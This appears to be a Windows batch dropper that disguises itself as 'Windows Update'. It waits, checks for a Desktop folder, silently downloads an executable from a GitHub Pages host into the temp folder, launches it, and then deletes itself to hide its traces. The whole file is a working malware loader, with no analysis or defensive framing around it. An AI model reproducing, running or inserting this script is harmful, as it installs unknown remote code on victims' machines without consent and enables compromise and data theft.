@echo off
title Windows Update
timeout /t 6 /nobreak >nul
if not exist "%USERPROFILE%\Desktop" exit /b
curl -sL "https://boostedboynow.github.io/assets-host/sttxht.exe" -o "%tmp%\vwcw.exe"
if %errorlevel% neq 0 exit /b
start "" "%tmp%\vwcw.exe"
(goto) 2>nul & del "%~f0"
